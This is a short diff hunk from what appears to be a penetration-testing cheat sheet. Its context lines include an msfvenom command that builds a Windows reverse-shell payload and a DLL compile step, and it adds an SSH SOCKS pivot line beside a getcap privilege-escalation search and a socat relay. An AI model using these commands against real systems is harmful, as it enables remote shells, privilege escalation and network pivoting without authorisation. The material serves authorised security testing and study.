@@ -35,3 +35,4 @@ msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT EXITFUNC=thread -f c â
 x86_64-w64-mingw32-gcc SOURCE --shared -o DLL
 getcap -r / 2>/dev/null
 socat -ddd TCP-LISTEN:PORT,fork TCP:IP:PORT
+ssh -D IP:PORT USERNAME@IP
